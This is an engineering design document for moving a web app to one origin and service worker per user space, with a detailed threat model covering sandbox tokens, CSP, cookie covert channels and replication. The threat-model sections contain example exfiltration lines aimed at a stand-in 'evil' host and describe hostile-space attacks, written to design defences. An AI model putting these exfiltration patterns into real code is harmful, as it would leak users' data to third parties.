# Space Workers

## Problems

### Load balancing

At the moment whole system shares single service worker that attempts to load balance between needs of several user spaces along with chrome. Despite our best efforts it is still hard to prioritize work and even if our heuristics end up being very good there is still limit to how much work single thread can do.

### Serving resources

Spaces being null origin prevents them from being controlled by a service worke which in turn implies that reading resources like images, stylesheets, fonts, videos all need to happen through a custom message passing channel and requires custom elements or other workarounds, forcing us to rebuild capabilities parallel to the one web already offers. E.g streaming video a real challenge because you can't simple use video tag instead you need to build out a whole pipeline over message ports.

### Same Version

In current architecture all spaces share same SW and therefor same version of dialog and service worker code also. It becomes impossible to upgrade one space and not the other, worse upgrade takes place whether you're ready or not.

## Goal

We could overcome above problems if we give each space own service worker on a custom origin. This way we stop fighting web platform and instead leverage it gaining ability to server resources from the DB directly so video, img, link, script and everything eles could just reference stored blobs.

At the same time we let the browser do the load balancing, sync spaces when their SW is active and stop sync when they are not. If browser decides clear cache on specific space other spaces survive eviction.

## Naming

Host is `tonk.network`. Each space is `{pub_key}.tonk.network`.

## Alternatives considered

### Path-scoped service workers on a single origin

A service worker scoped to `/space/{did}/` on one origin would give us separate registrations per space, independent lifecycle, independent versions, browser-managed scheduling, and real `fetch` interception. That covers load balancing, resource serving, and versioning without wildcard DNS and without the local dev problem.

What it does not give us is **storage isolation** and **security isolation between spaces**. All spaces would share one origin's IndexedDB, one quota, and one eviction decision, and space code could read every other space's data.

Rejected. The whole cost of wildcard DNS and hostile local dev is being paid for isolation, not for the service worker or resource-serving wins. Those we could have had cheaply.

### CSP embedded enforcement (`csp` attribute on iframe)

Would let the host impose a policy on the guest document. Effectively dead: Chrome removed enforcement, Firefox and Safari never implemented it, and even where it existed the embedded document had to opt in via `Allow-CSP-From` or the load was blocked. Cannot be used to constrain a guest that does not cooperate, which is the only interesting case. Do not build on it.

### Preview envs as nested subdomains

`{pub_key}.pr-123.tonk.network` needs a second wildcard depth, which wildcard certs do not cover. Rejected in favour of flat labels (see Preview environments).

## Security model

Four enforcement mechanisms, four different enforcers, none of which depend on space code behaving.

| Boundary | Enforced by | Protects against |
| --- | --- | --- |
| Origin | Browser | Space reading another space's storage, or the host's |
| iframe `sandbox` | Host document | Top-level navigation, popups, and other exfiltration-by-navigation |
| CSP | Space service worker (ours) | Network access from space code |
| Site separation (PSL) | Browser | Cookie-based covert channel between spaces |

### Threat model

Spaces load and execute **author-supplied code**. That code is not trusted. It may be hostile, and two spaces may be cooperating to exchange data outside the bridge.

The service worker is **not** author code and **is** trusted. See The trusted service worker invariant.

### Sandbox with `allow-same-origin`

Spaces are framed with `sandbox="allow-scripts allow-same-origin"`.

The usual footgun with that pair is that a same-origin guest can reach into its framer and delete its own `sandbox` attribute. That does not apply here: `{pub_key}.tonk.network` is a different origin from `tonk.network`, so the guest cannot touch the parent document and cannot un-sandbox itself.

What `allow-same-origin` buys is exactly what this redesign is for: a real origin, therefore storage, a service worker, and real `fetch` semantics.

Consequence: **the sandbox is no longer the isolation boundary.** Today it is the whole boundary. After this change the origin is the boundary, and the sandbox is defense-in-depth for a specific list of capabilities. Stop describing spaces as "sandboxed"; describe them as separate origins, additionally sandboxed against navigation and popups.

Tokens deliberately withheld, each for a reason:

- `allow-top-navigation` and `allow-top-navigation-by-user-activation` — a space must not navigate the top frame. This is exfiltration-by-navigation, which CSP `connect-src` does **not** cover.
- `allow-popups` — same reason. `window.open('https://evil/?' + data)` is a network egress path.
- `allow-modals`, `allow-pointer-lock`, `allow-downloads` — UI capture and unwanted egress.
- `allow-forms` — see `form-action` below. We have been bitten by this before.

### The trusted service worker invariant

> The service worker script for a space origin is always Tonk-authored code served by the Tonk server. Space-authored code runs as page content under that service worker, never as the service worker.

This is what makes CSP enforceable. A service worker can return a fully synthetic `Response` with whatever headers it likes, and the browser applies CSP from the response it committed — not from whatever the server sent on some earlier navigation. So a hostile service worker could simply serve itself no CSP at all. The policy is only worth anything if the service worker is ours.

What keeps it ours:

1. **The service worker script fetch bypasses the active service worker.** A service worker never intercepts requests for service worker scripts. `register()` always goes to the network, so a compromised service worker cannot serve its own replacement. *(Verify in the spike — see Open questions.)*
2. **The server never serves author bytes.** Every server response from a space origin is Tonk-authored HTML (see Catch-all bootstrap). `register('/asset:evil.js')` fetches from the network, gets `text/html`, fails the MIME check.
3. **`X-Content-Type-Options: nosniff`** on the catch-all, so nothing can coax sniffing into treating it as script.
4. **`worker-src 'none'`** in the service-worker-served CSP, so `register()` from a space document fails closed regardless of what the network does. Registration is governed by the *registering document's* `worker-src`.

Rules 2 and 3 make the attack fail on content type. Rule 4 makes it fail on policy. Keep both: rule 4 is the one that survives a future change to what the server serves.

**Unregistering** is freely available to space code (`getRegistrations()` then `unregister()`, same-origin, no prompt) and is self-harm with automatic recovery. With the service worker gone the space stops working — no blobs, no assets. The next navigation hits the server, gets the bootstrap with our CSP, and reinstalls. Not an attack.

### Catch-all bootstrap

The server serves the same static Tonk-authored HTML page from any URI on a space origin.

This is the self-healing mechanism: with the service worker gone, a deep link like `/asset:{hash}` must return something that boots and re-registers it, rather than a dead 404.

It means `/asset:{hash}` returns 200 `text/html` rather than 404, so the "no author bytes over the network" property rests on content type rather than on the path being empty. That is fine, given `nosniff` and `worker-src 'none'`, but it must be stated as a deliberate choice rather than left as an accident.

The bootstrap HTML must be **path-independent**, since it is served at arbitrary paths and relative asset references would resolve differently at `/asset:x` than at `/`.

### CSP

Delivered as a header on the space's own responses. Two sources, both ours:

- **First load**, no service worker yet: headers come from the real server on the catch-all response. This is the one guaranteed-trustworthy response and it is where registration happens. Getting the policy right here matters more than anywhere else.
- **Every load after**: the service worker constructs the response and sets the headers.

Policy sketch:

- `default-src 'none'` — explicit allowances only. Safer than `'self'`, which has historically leaked through prefetch-adjacent directives.
- `connect-src 'none'` — no fetch, XHR, WebSocket, EventSource, or beacon. See Network access.
- `img-src 'self'`, `media-src 'self'`, `font-src 'self'`, `style-src 'self'`, `script-src 'self'` — everything resolves through the service worker into the space DB. This tight a policy actually working is a nice property of the architecture.
- `worker-src 'none'` — blocks `register()`.
- `frame-ancestors https://tonk.network` — a space may only be framed by the host.
- `form-action 'none'` — closes form-navigation egress.
- `base-uri 'self'` — check against `<base href>` usage (see Open questions).
- No `report-uri` / `report-to` to an external endpoint: a space can trigger violations in a pattern that encodes data.

Host side: `frame-ancestors` on the host, plus COOP and COEP. `Cross-Origin-Resource-Policy: same-origin` on space resources.

**What survives a fully compromised space service worker**, should the invariant ever break: the iframe `sandbox` attribute (host-controlled, unstrippable cross-origin), `frame-ancestors` on the host, the host's COOP/COEP, and the origin itself. Everything in the space's own response headers does not.

### Network access

**Space code gets no network.** `connect-src 'none'` plus `'self'`-only resource directives means no outbound path from author code at all. Everything it can name resolves through the service worker into the space DB.

Leaks that survive `connect-src 'none'`, closed by the sandbox token list above rather than by CSP:

- Navigation is **not** covered by `connect-src`. `window.open`, `top.location`, `<a target=_blank>`, `<form action="https://evil/">`. This is the first thing to check.
- Prefetch and `<link rel=dns-prefetch>` — covered by `default-src 'none'`.

**Sync is the exception and must be stated precisely.** The space has no network; the space's *data* still replicates. Replication runs in the trusted service worker under Tonk's rules, not in space code. See Replication I/O.

**Product consequence:** no third-party embeds. No YouTube iframes, no external images, no CDN fonts, no analytics. Everything a space renders must be in its DB. This is a stated decision, not a discovered limitation.

### Cookies and the covert channel

`a.tonk.network` and `b.tonk.network` are cross-origin but **same-site**. Storage, IndexedDB, Cache Storage, service worker registrations, and `postMessage` targeting are all origin-scoped and therefore already isolated. Cookies are not.

The attack: two cooperating spaces both write `Domain=tonk.network` cookies and both read them, giving a bidirectional covert channel that bypasses the bridge entirely. Since spaces run author code, both ends may be hostile.

**CSP cannot close this.** There is no cookie directive; a proposal existed years ago and was dropped. CSP governs which resources a document may load and execute and has no hooks into `Set-Cookie` or `document.cookie`. "Lock down CSP aggressively" reads as covering this and does not.

What actually closes it:

- **PSL listing — the real fix, and a requirement.** Get `tonk.network` onto the Public Suffix List as a private entry. Every `{pub_key}.tonk.network` then becomes a different *site*, not merely a different origin. `Domain=tonk.network` from a space is rejected by the browser at the cookie store, and neither space can opt back in. Free, a PR to the PSL repo, a few weeks to propagate through browser releases. Cost: we can never set a `Domain=tonk.network` cookie ourselves, and delisting is slow. If the host needs no cross-subdomain cookies this costs nothing. If we want to keep the apex free, put spaces under `*.spaces.tonk.network` and list `spaces.tonk.network`.
- **`__Host-` prefix** on anything the host sets. Browser-enforced: rejected unless `Secure`, `Path=/`, and **no** `Domain` attribute. A subdomain therefore cannot forge or overwrite it.
- **Not using cookies**, which is the strongest version and where we believe we already are. Confirm.

Deleting `document.cookie` from the guest's JS environment at bootstrap is defeatable — a fresh same-origin iframe or worker gets a clean realm — so it is a speed bump, not a boundary. `Clear-Site-Data: "cookies"` is served by the space's own service worker and hostile code just stops sending it.

Channels that remain after PSL: timing and resource contention (unfixable, accept), `window.name` across navigations in the same tab, and **the host bridge itself**. Once network is closed the bridge is the only door and every capability on it is the real attack surface. That is a better place for the remaining design work to live, since it is our code and we can enumerate it.

### Approved embeds

A visitor may let a space embed a third-party origin (YouTube, Google Maps) by explicitly approving it.

A service worker cannot hold such a request pending: an `<iframe src="https://youtube.com/…">` navigation goes to the service worker of the *target's* scope, never the space's, and CSP blocks it before any worker sees it. What works is that the space worker writes the CSP on every document it serves, so a grant widens the policy it writes.

1. The embed is blocked, and a `securitypolicyviolation` event fires in the space document.
2. The space asks the host for the origin (`request-embed`). The profile chrome renders the prompt.
3. A grant is a fact in the **visitor's profile**, keyed by (space, origin). It never lives in the space, so an author cannot grant themselves.
4. The host tells the space worker over the port it already holds. The worker adds the origin to `frame-src` (or `img-src`, `media-src`) and the frame reloads.

The prompt must say what it grants. Once `youtube.com` is allowed, space code can encode data into an embed URL, so the honest wording is "this space may send data to youtube.com", not only "show a video". Space code can also raise violations on purpose, so prompts are rate-limited and a dismissal sticks per origin.

## Replication I/O

**Correction to the "no network" claim.** Space databases replicate over our hosts. So either the space origin gets network access, or we establish a channel from the guest service worker to the host service worker which performs the I/O on its behalf.

The latter is preferred: it keeps `connect-src 'none'` intact and keeps all egress under host-controlled code. The guest service worker obtains a `MessagePort` on load and does its replication I/O through it.

**The lifecycle wrinkle.** Service workers are killed and restarted at any time, and a `MessagePort` held by a dead service worker is gone. The host service worker cannot proactively reach a guest service worker, so the port cannot be re-delivered directly.

**Recovery is guest-initiated through a client.** On restart the guest service worker calls `clients.matchAll()`, postMessages one of its own clients, and asks it to broker a fresh port from the host. The client relays to the host, the host hands back a port. The guest drives its own recovery; the client is only a relay, and does not need to detect the restart.

Use `matchAll()` rather than `clients.get(id)` — iOS has returned undefined from `clients.get()` before.

Consequences to design for:

- **A space with no open client cannot sync**, since the guest service worker has nobody to ask. Any open client is sufficient. Whether that matters depends on whether we expect background sync for closed spaces.
- A heal probe and keepalive, as in the existing service worker restart work.

This is the same shape as problems we have already solved once. Reuse the approach rather than rediscovering it.

Also note: no stream transfers into sealed frames on Safari, which forced a credit-based `MessagePort` fallback previously. Same constraint applies to this channel.

## Challenges

### Offline Limitations

One service worker means even offline you can create new space, however with SW per space creating a new space offline becomes impossible because first load of that space requires a service worker.

**Decision: pre-warmed pool, loaded in hidden iframes.**

A pooled space is a pre-assigned keypair whose public key is its origin, warmed by loading it in a hidden iframe so its service worker installs while online. Creating a space offline takes one from the pool.

To settle:

- **Warming cost.** N iframe loads, each a bootstrap fetch plus service worker install plus wasm compile. We already track cold-load perf and have already found boot serialized behind slow work. Warm lazily after first paint, one at a time on idle callbacks, and persist the knowledge that an origin is warm so it is not redone every session.
- **Shared HTTP cache.** Cache is partitioned by top-level site. Pooled iframes share the `tonk.network` top-level site, so the wasm bundle *should* be shared rather than fetched N times. **But PSL listing splits spaces into separate sites, which may lose that sharing and make each pooled origin pull the full runtime.** This is a direct tension between two things this document recommends. Measure before committing.
- Pool size, where unused keypairs live, and whether a pooled-then-used space is distinguishable from a normally-created one.
- UX when the pool is empty and the user is offline.

The hybrid alternative — a shared offline worker, migrated to its own origin once online — was set aside because migration is painful. Note however that **migration is required anyway** for rotation and forking, so the subsystem exists either way and the hybrid is cheaper than it first appears. Revisit if pool warming proves too expensive.

### Migration between origins

Required for rotation and forking: a space's origin derives from its public key, so a new key means a new origin and all its data is stranded at the old one.

There is no browser primitive for moving IndexedDB across an origin boundary. It is an explicit protocol over `postMessage` between two iframes with the host mediating, which means:

- O(space size), needing chunking, backpressure, and resumability.
- No transferable streams on older Safari, so the credit-based `MessagePort` fallback applies here too.
- **Partial migration is the dangerous state.** Two-phase commit: copy everything, verify, mark the new origin authoritative, only then delete the old. Plus a recovery path for a crash at any point.

Open: how often rotation and forking actually happen. Rare and user-initiated tolerates a visible progress UI; routine makes this a hot path needing a much better design.

### Lifecycle issues multiplied

Service worker lifecycle is already a very complex to manage, with worker per space we multiply it.

Note the tension with the Same Version goal: per-space version independence is a *feature*, which means deliberately letting spaces run old service workers. But a stale service worker runs stale security policy, so **update cadence is now a security control**, not just a versioning nicety. Decide how far version drift is allowed before an update is forced.

### Origin per space

Requires a wildcard DNS record and a wildcard certificate in production.

### Preview environments

Wildcard certs cover exactly one label depth. `*.tonk.network` works; `{pub_key}.pr-123.tonk.network` does not.

**Decision: flat labels.** `{pub_key}--pr-123.tonk.network` is a single label and is covered by the existing wildcard. Nothing structural changes, no cert work, no DNS work.

Check that `{pub_key}` plus separator plus env tag stays under the 63-character DNS label limit, and the whole name under 253.

Alternatives if flat labels do not work out: a separate apex per preview tier (`*.pr-123.tonk.dev`); Let's Encrypt wildcards via DNS-01 (free to issue — the cost question is whether uploading custom certs to Cloudflare needs a paid plan, not the issuance). Explicitly rejected: running previews in single-service-worker path-scoped mode, since we would be testing a different architecture than we ship.

### Local development

**Decision: real dev domain on loopback.** A wildcard DNS record `*.dev.tonk.network` resolving to `127.0.0.1`, with a wildcard certificate we ship or fetch. Works in every browser, costs one DNS record and a cert.

Safari specifically does not do localhost suborigins, but no one develops in Safari, so that is not the motivation — the motivation is that this is simply the standard answer and it is cheap.

Rejected: `dnsmasq` / `.local` tricks (fail on Safari and CI); a dev-only fallback to path-scoped single-service-worker mode (two architectures, and the one we test is not the one we ship).

In scope for this work: cert trust in headless Chrome for the e2e stack, the two-service `dev:web` setup, and Trunk's dev server host handling. All currently assume one origin.

The WebAuthn virtual authenticator just needs to bind to the dev host rather than `localhost`, since passkeys stay in the top page. Config, not redesign.

## Storage quota

Quota isolation cuts both ways and the doc should not claim only the upside.

- **Chrome.** Quota is per storage key (origin-scoped), derived from available disk — roughly 60% of disk as a global pool, with an individual origin able to use much of it. Ten space origins each see a large ceiling; the real limit is aggregate disk. Net: more headroom than today. Eviction is per-origin, so "other spaces survive eviction" holds.
- **Firefox.** Global pool based on disk, with a per-*group* (site) limit of 20%. All `*.tonk.network` origins share that group limit because they are the same site — no worse than today in aggregate, but no better, and one space blowing the group budget can take out its neighbours. **PSL listing fixes this**: separate sites means separate groups and separate eviction.
- **Safari.** Per-origin accounting, but a fresh origin starts with a small allowance and there are site-level and app-level ceilings, so N spaces do **not** get N× a single origin's budget. Plus 7-day eviction for non-installed sites applies per-origin: a space not visited in a week can be wiped while its siblings survive. Visiting the host does not protect a space origin.

So independent eviction means independent *survival* and independent *loss*. A rarely-opened space is on its own clock, where today touching any space keeps all of them alive. Whether that is a feature depends on whether users expect spaces to be durable.

Follow-ons:

- PSL listing is more valuable, not less. Another reason to treat it as a requirement.
- **`navigator.storage.persist()` per space origin** exempts an origin from automatic eviction in Chrome and Firefox. It must be requested per origin. Chrome grants silently on engagement heuristics; Firefox prompts; Safari does not really honour it. There is a real "ten permission dialogs" failure mode. Decide whether spaces request persistence on first load and what that UX is.

Numbers above should be **measured, not trusted** — browser quota behaviour changes and docs lag. `navigator.storage.estimate()` from inside several space origins, on each engine, with a deliberately large space.

## What regresses

- **Cross-space reads.** Believed to be nothing today, with profile as the likely exception — profile main is an upstream for the account and has real machinery. If profile is itself a space with its own origin, that relationship crosses an origin boundary and needs an explicit protocol. **Verify rather than assume.**
- **Shared runtime cache**, if PSL listing splits spaces into separate sites. See the pool warming note.
- **Coordination primitives.** `BroadcastChannel`, `navigator.locks`, `SharedWorker` are all origin-scoped and silently become per-space.
- **DID visibility.** The public key is now in DNS queries and TLS SNI rather than in a TLS-encrypted path. Decide whether that is acceptable.
- **Fake-origin navigation.** The `<base href>` mechanism exists because guests believe they are on a fake origin. With a real origin it may simply go away, which would be a simplification worth claiming as a win. Confirm, and check the interaction with `base-uri 'self'`.

## WebAuthn

**Not affected.** Passkeys run in the top page at `tonk.network`, never in a space iframe, so the RP ID is `tonk.network` and spaces never assert a credential. Registration and the PRF-derived account custody envelope stay exactly where they are.

PSL listing does not change this. RP ID matching is a registrable-domain-suffix rule, and a credential registered at `tonk.network` and used from `tonk.network` is an exact match with no suffix relationship in play. What the PSL entry does remove is the *option* of a space origin ever asserting the parent RP ID — which is a capability we do not want.

Keep it that way. A space needing its own credential would mean a different RP ID, different PRF outputs, and a different key derivation.

## Open questions

- Does a service worker script fetch genuinely bypass the active service worker in all three engines? The trusted-service-worker invariant rests on it. If any engine lets the active service worker serve the next one, a single compromise becomes permanent and self-perpetuating.
- Does PSL listing break the shared HTTP cache for pooled origins, and how much does that cost?
- Is background sync for spaces with no open client a requirement? A guest service worker with zero clients has nobody to broker a port through.
- Do we already use cookies anywhere on the host?
- How often do rotation and forking happen?
- Does `<base href>` fake-origin navigation survive, or go away?
- How far may a space's service worker version drift before an update is forced?

## What is built

On `feat/worker-per-space-on-peer`, over `feat/dialog-peer`. Where the deployment's `/.well-known/tonk` names `sites`, every site renders on an origin of its own with a worker of its own, and each worker holds its own database. Without `sites` nothing changes: one worker, sealed frames.

Three kinds of origin:

- **The app's** (`tonk.network`). Its page frames the profile and runs passkey ceremonies. Its worker holds no database: it serves the shell and passes every `/api/` request to the profile's worker.
- **A profile's** (`profile.{host}`). Its worker holds the person's profile: their key, their account, the spaces they have, and the authority over each.
- **A space's** (`{label}.{host}`). Its worker runs under a profile made for that origin and holds a delegation for its one space, issued by the person's profile for twelve hours and renewed before it lapses. It holds the space's content and is the one that syncs it.

How it hangs together:

- **A site frame loads `/space-origin.html`**, which registers `/space_worker.js`, waits for control, and asks its parent for its document. The same Rust worker runs on every origin. The script tells a profile from a space by the first label of its hostname.
- **Workers talk over ports that pages open.** A page frames an origin and hands each worker an end. The app's page frames the profile's origin unseen for this (`#connector`); the profile's page does the same for a space that is not on screen, and drops the frame once the space has been quiet for a minute.
- **Requests go down a port, answers come back up it**: status and headers, then the body in pieces, so a subscription keeps flowing. The app's worker passes the profile's every `/api/` request; the profile's passes a space's everything under one of the space's branches.
- **A port message does not wake a stopped worker.** While something is being answered the asking worker probes, and a silent worker's port is given up: the page is asked for a new one, and handing it over is what starts the worker again. A read that was being answered is asked again of the new worker; a write is failed back to whoever made it, since it may have landed.
- **The profile's worker answers as its own frame.** A request from the app's page is answered as though the profile's frame in that tab had made it, so the site stamp has a live client, and what the worker tells "the page that asked" (go here, run this passkey ceremony) it tells that frame, which passes it up.
- **What a command does to a space's content, the space's worker does.** A profile command that has such a part hands it over as a command for the space's worker to run: a rename forwards itself, pausing sync runs on that worker's own profile branch, an invite is minted by the profile and recorded by the space (`RecordInvite`). The other way, a space asked for an invite by its own share button passes the asking up, since a delegation it issued would lapse with its own.
- **A space's worker is told its account, its remote and the person's name in its delegation**, signed, and told to take up a new one when any of them changes. It writes the name on its own roster: the profile used to write it into every space it held. Signing in moves the space's own roster entry to the new account, on a command only the profile settling the handover sends (`MoveMembership`): another profile taking over on the same device changes the account too, and must not move anyone's entry.
- **A new space is filled by its own worker**: the standard library, the definitions of a template, or a copy of another space, which the profile fetches from that space's worker and passes along. A removed space is forgotten by its own origin, worker and all.
- **A person who was here before moves once.** The worker that held their profile in the app's origin stands its database down the moment it reads that sites have origins. The first time the profile's worker starts it copies in what the app's origin stored: every database record by record, and the files beside them. A key the browser will not export goes with its record. A space then moves on to its own origin the first time it is opened, from a snapshot the profile's worker makes of its copy. Once the profile's worker has started from what it copied, the app's origin removes its own: its databases and its files. What moves is what dialog keeps a profile in now: the database its keys are kept in (`dialog.credential`), the profile's own (a space under its DID) and one for each space. A profile kept under the former names (`tonk.profile`) is not read by dialog any more, so it is neither moved nor removed.
- **A space is held once on a device.** A space made where spaces have origins never reaches the profile's storage. One that does (it was there before, or a join pulled it to read the invitation's roster and commit its claim) is let go of when the space's worker says it holds the space: every block, every blob and each branch's head go in one transaction, and where the space syncs is recorded again. The space's identity and the certificates the profile acts on it with stay. What the space's worker did not take from the profile's copy is pushed first, and kept if that fails. The profile's worker syncs no space it holds nothing of.
- **Who is looking is a fact in the space.** Each worker says, in a space branch's session overlay, which account its session acts for, and the roster marks that member as you.
- **Sessions survive a stopped worker.** Each worker saves what its site stamps were made from and restores them before serving.
- **Assets are served natively**: `/asset:{hash}` with media type, size and ranges; `PUT /` stores one.

Verified in headless Chrome against `dev:web` (two browser profiles for sharing):

- A new person: profile, new space, rename, reload, offline reload, either worker stopped mid-session, an update of either worker, two tabs.
- Creating an account with a passkey, activating it, and the space syncing from its own worker under the delegated chain.
- Sharing: mint from the bar and from the space's own branch, short link, join on a second device, content and roster arriving through the remote.
- A space from a template, with the template's app running under the space's policy. A duplicate. Pause and resume. Leaving a space.
- A person from before: a browser running the single worker, reloaded once sites were named, with the profile moved under the same identity, its spaces listed, and a space seeded into its own origin on first open.
- Held once: after that move the app's origin stores nothing, and the profile's origin keeps two blocks of the space (its own record of it) where the space's origin keeps the content. The space still lists, opens and renames with every worker stopped in between. Two joins from fresh browsers leave the joiner's profile with nothing on the space's `main`, and all three names on the roster.

Corrections to the design above:

- **`worker-src blob:` rather than `'none'`.** It still refuses `register()`, since a service worker script must be same-origin, but it leaves blob workers available to author code.
- **`'unsafe-eval'` is required.** Author views and element shims are compiled from strings (`new Function`). This costs nothing under the threat model: space code is untrusted by design, and the boundary is the origin and its lack of network, not `script-src`.
- **`frame-ancestors` must list the profile's origin as well as the app's**, and the profile's `frame-src` must allow site origins. Every ancestor is checked, not only the parent.
- **The first load has no CSP.** The shell comes from the server before any worker exists. The server has to send a policy on the shell, but that policy must allow `worker-src 'self'`, or the shell could not register its worker.
- **Storage is partitioned by the site of the page around a frame.** A site on another registrable domain than the app (staging: `tonk.spot` under `staging.tonk.xyz`; development: `*.localhost`) keeps its storage per framing site. Production and previews are same-site and are not partitioned.
- **A key the browser will not export can still be handed to another origin** by `postMessage`, which is what makes the one-time move possible without touching custody.
- **Web Awesome fetches its icons from `ka-f.fontawesome.com`.** `connect-src` blocks that, so those icons are missing. The icon set has to be served from our own origin.

What a space's code can and cannot reach:

A space's worker has a network and the space's author code has none, on the same origin, with the same storage. Closed so far: the remote and the account are read from the signed delegation, whose chain is checked from the space's key down; a space's page may ask its worker only for its own space's data, not for its remote, an invite, a join or anything of the worker's own profile; the shell takes a port before anything else in its document can; the kept wasm is checked against the worker's stamp on every load.

Still open, and a hostile template is the case that matters:

- **The worker fetches URLs a space names.** A space's recorded seed source is fetched to check for updates, and notation that is evaluated can include other documents. Either carries data out in the URL.
- **The worker's storage is the page's storage.** IndexedDB and the cache are one per origin, so author code can read and write the worker's replica, its profile key (usable, not exportable) and its saved delegation. The delegation is for this one space, so the damage is to that space.

Not done:

- **Promote and expel do not work where spaces have origins.** Both read the chains the space retains and write its roster, on the profile's copy, which now holds neither. They have to become commands the space's worker runs, as the invite did. The update check is in the same place. The agent link is untested.
- **No going back.** The app's origin removes its copy after the move, so a deployment that stops naming sites finds an empty device. Naming sites is one way.
- **Unmounting.** dialog's storage cannot let go of a space it has mounted, so the profile's database for a released space is emptied rather than deleted.
- **`GET /api/repository/{space}`** still answers from the profile, members included. Nothing in the bar reads its members any more; it is asked only whether the device holds the space.
- **An origin per profile.** Every profile on a device shares `profile.{host}`. The roster of profiles and the active one would have to live with the app, and signing in to another account would have to carry the ceremony's result to another origin's worker.
- **The server does not yet answer a site's hostname with the shell and its policy.**
- Firefox and Safari. Pre-warming origins for offline creation.

Known and not from this work:

- An invite minted after signing in names the retired onboarding account as inviter, so the member graph cannot place the person who joins.
- In development a rebuild that changes nothing gives the app's worker the same build id with a different manifest hash, since the page's preload links come out in another order, and its install is refused. The worker in place is the same build, so nothing is lost.
- The development proxy does not pass the requested host on, so the configuration names sites whatever name the app is opened by.

## Staging

Checked on 2026-09-23:

- `tonk.network` is production and live; its service DID is `did:key:z6MkthzL…LPup`. (An earlier check here said otherwise. That check was wrong: this machine's `/etc/hosts` maps `tonk.network` to `127.0.0.1`.)
- `tonk.spot` and `*.tonk.spot` are routed to the same production worker (`tonk-access-service`), with the same service DID. Any label gets a valid certificate and the app shell.
- `tonk.host` is an active zone with nothing on it.

Decision: `tonk.spot` and `*.tonk.spot` move to the staging worker (`tonk-access-service-staging`). `staging.tonk.spot` needs nothing of its own, since `*.tonk.spot` covers it.

## Spike

Prove end to end on one space, before anything else is built:

1. **Service worker registration inside a sandboxed same-origin cross-origin iframe, on iOS Safari.** The whole design collapses without it and Safari's service-worker-in-iframe behaviour has historically been the weakest. Do this first.
2. Wildcard cert plus loopback wildcard DNS for local dev, working in Chrome and Firefox including the headless e2e setup.
3. Blob serving from the space DB through the service worker: `<img>`, `<video>` with range requests, `<link>`, fonts.
4. Guest service worker to host service worker `MessagePort` handshake, including re-establishment after a forced service worker restart.
5. `navigator.storage.estimate()` across several space origins on each engine.
6. Confirm the service-worker-script-fetch-bypasses-active-service-worker behaviour.

Then a decision point before committing to migration, pooling, and the PSL request.
